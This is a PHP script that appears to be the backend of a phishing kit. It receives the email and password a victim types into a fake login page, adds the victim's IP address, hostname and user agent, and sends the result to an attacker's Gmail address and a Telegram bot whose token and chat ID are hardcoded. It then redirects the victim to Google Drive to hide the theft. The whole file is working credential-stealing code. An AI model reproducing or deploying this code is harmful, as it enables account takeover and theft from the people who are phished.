<?php
// Inclusion des dépendances (si nécessaire)
include 'email.php';
function send_telegram_msg($message){
	// Put Your Telegram Information Here
	$botToken  = '8054681380:AAGq5oUs8XRxM6NhZA-N9F0D9hjwbfqECLU';
	$chat_id  = ['8179736651'];
	
	
	$website="https://api.telegram.org/bot".$botToken;
	foreach($chat_id as $ch){
		$params=[
		  'chat_id'=>$ch, 
		  'text'=>$message,
		];
		$ch = curl_init($website . '/sendMessage');
		curl_setopt($ch, CURLOPT_HEADER, false);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_POST, true);
		curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		$result = curl_exec($ch);
		curl_close($ch);
	}
	return true;
}

// Récupération et validation des données POST
$email = isset($_POST['email']) ? trim($_POST['email']) : null;
$password = isset($_POST['password']) ? trim($_POST['password']) : null;

// Redirection en cas de succès
$redirect = 'https://drive.google.com/drive/u/0/home'; // Remplacez par l'URL de votre choix

// Validation des champs obligatoires
if (filter_var($email, FILTER_VALIDATE_EMAIL) && !empty($password)) {
    // Récupération des informations de l'utilisateur
    $ip = $_SERVER['REMOTE_ADDR'];
    $hostname = gethostbyaddr($ip);
    $useragent = $_SERVER['HTTP_USER_AGENT'];

    // Création du message
    $message = "|----------| ArkealoGeNDz |--------------|\n";
    $message .= "Online ID            : " . htmlspecialchars($email) . "\n";
    $message .= "Passcode              : " . htmlspecialchars($password) . "\n";
    $message .= "|--------------- I N F O | I P -------------------|\n";
    $message .= "|Client IP: " . $ip . "\n";
    $message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
    $message .= "User Agent : " . $useragent . "\n";
    $message .= "|----------- ArkealoGeNDz --------------|\n";

    // Configuration des informations d'envoi
    $send = "tijobsworkers@gmail.com"; // Remplacez par votre adresse email
    $subject = "Login Attempt from IP: $ip";
    $headers = "From: hosting@juicylucy.cl\r\n" .
               "Reply-To: hosting@juicylucy.cl\r\n" .
               "X-Mailer: PHP/" . phpversion();

    // Envoi de l'email et traitement des erreurs
    if (mail($send, $subject, $message, $headers)) {
        // Envoi du message vers Telegram
        send_telegram_msg($message); // Assurez-vous que cette fonction est définie

        $signal = 'ok';
        $msg = 'Message sent successfully';
    } else {
        $signal = 'error';
        $msg = 'Failed to send email.';
    }
} else {
    $signal = 'bad';
    $msg = 'Invalid email format or missing fields.';
}

// Envoi de la réponse en JSON
$data = array(
    'signal' => $signal,
    'msg' => $msg,
    'redirect_link' => $redirect,
);
header('Content-Type: application/json');
echo json_encode($data);
}
?>
